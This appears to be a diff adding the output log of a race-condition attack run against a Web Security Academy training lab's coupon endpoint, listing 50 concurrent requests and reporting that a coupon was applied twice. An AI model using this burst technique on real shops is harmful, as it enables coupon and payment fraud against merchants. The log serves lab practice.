@@ -1,0 +1,59 @@
+[*] Starting race condition attack at Sat Nov  1 02:33:33 2025
+[*] Target: https://0acb004103b9c15780113f4c002700e2.web-security-academy.net/cart/coupon
+[*] Concurrent bursts: 50 connections × 1 requests each
+[*] Timeout: 3.0s (matching observed server response time)
+------------------------------------------------------------
+[15-00] DUPLICATE | Time: 1.651s | Len: 7241
+[26-00] DUPLICATE | Time: 1.652s | Len: 7241
+[40-00] DUPLICATE | Time: 1.656s | Len: 7241
+[00-00] DUPLICATE | Time: 1.662s | Len: 7241
+[05-00] DUPLICATE | Time: 1.672s | Len: 7241
+[30-00] DUPLICATE | Time: 1.686s | Len: 7241
+[32-00] DUPLICATE | Time: 1.710s | Len: 7241
+[27-00] DUPLICATE | Time: 1.742s | Len: 7241
+[22-00] DUPLICATE | Time: 1.773s | Len: 7241
+[47-00] DUPLICATE | Time: 1.778s | Len: 7241
+[44-00] DUPLICATE | Time: 1.780s | Len: 7241
+[16-00] DUPLICATE | Time: 1.789s | Len: 7241
+[11-00] DUPLICATE | Time: 1.791s | Len: 7241
+[39-00] DUPLICATE | Time: 1.799s | Len: 7241
+[33-00] DUPLICATE | Time: 1.800s | Len: 7241
+[29-00] DUPLICATE | Time: 1.910s | Len: 7241
+[10-00] SUCCESS? | Time: 1.911s | Len: 7170
+[24-00] SUCCESS? | Time: 1.968s | Len: 7170
+[25-00] DUPLICATE | Time: 2.015s | Len: 7241
+[12-00] DUPLICATE | Time: 2.023s | Len: 7241
+[36-00] DUPLICATE | Time: 2.040s | Len: 7241
+[37-00] DUPLICATE | Time: 2.059s | Len: 7241
+[14-00] DUPLICATE | Time: 2.061s | Len: 7241
+[18-00] DUPLICATE | Time: 2.652s | Len: 7241
+[20-00] DUPLICATE | Time: 2.661s | Len: 7241
+[13-00] DUPLICATE | Time: 2.662s | Len: 7241
+[01-00] DUPLICATE | Time: 2.672s | Len: 7241
+[07-00] DUPLICATE | Time: 2.706s | Len: 7241
+[06-00] DUPLICATE | Time: 2.725s | Len: 7241
+[19-00] DUPLICATE | Time: 2.730s | Len: 7241
+[23-00] DUPLICATE | Time: 2.731s | Len: 7241
+[03-00] DUPLICATE | Time: 2.741s | Len: 7241
+[02-00] DUPLICATE | Time: 2.744s | Len: 7241
+[17-00] DUPLICATE | Time: 2.800s | Len: 7241
+[41-00] DUPLICATE | Time: 2.806s | Len: 7241
+[28-00] DUPLICATE | Time: 2.917s | Len: 7241
+[04-00] TIMEOUT | Time: 3.003s
+[08-00] TIMEOUT | Time: 3.003s
+[09-00] TIMEOUT | Time: 3.003s
+[21-00] TIMEOUT | Time: 3.002s
+[31-00] TIMEOUT | Time: 3.002s
+[34-00] TIMEOUT | Time: 3.002s
+[35-00] TIMEOUT | Time: 3.002s
+[45-00] TIMEOUT | Time: 3.002s
+[46-00] TIMEOUT | Time: 3.002s
+[48-00] TIMEOUT | Time: 3.002s
+[49-00] TIMEOUT | Time: 3.002s
+[38-00] TIMEOUT | Time: 3.002s
+[42-00] TIMEOUT | Time: 3.002s
+[43-00] TIMEOUT | Time: 3.002s
+------------------------------------------------------------
+[*] Attack completed at Sat Nov  1 02:33:36 2025
+[*] SUCCESS? responses: 2
+[!] Note: Cart shows 2 coupons but script detected 2
